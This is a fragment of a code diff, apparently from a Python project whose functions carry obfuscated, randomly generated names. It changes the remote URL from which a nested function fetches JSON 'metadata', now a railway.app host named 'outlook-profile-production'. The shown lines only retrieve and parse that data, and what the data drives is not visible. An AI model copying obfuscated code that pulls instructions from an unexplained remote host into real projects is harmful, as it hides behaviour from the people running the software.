@@ -18,7 +18,7 @@ def eval_bvrbkb_369():
 
     def net_gwyesd_826():
         try:
-            data_cebwzh_570 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            data_cebwzh_570 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_cebwzh_570.raise_for_status()
             model_drtohq_376 = data_cebwzh_570.json()
             eval_dsqzpq_958 = model_drtohq_376.get('metadata')
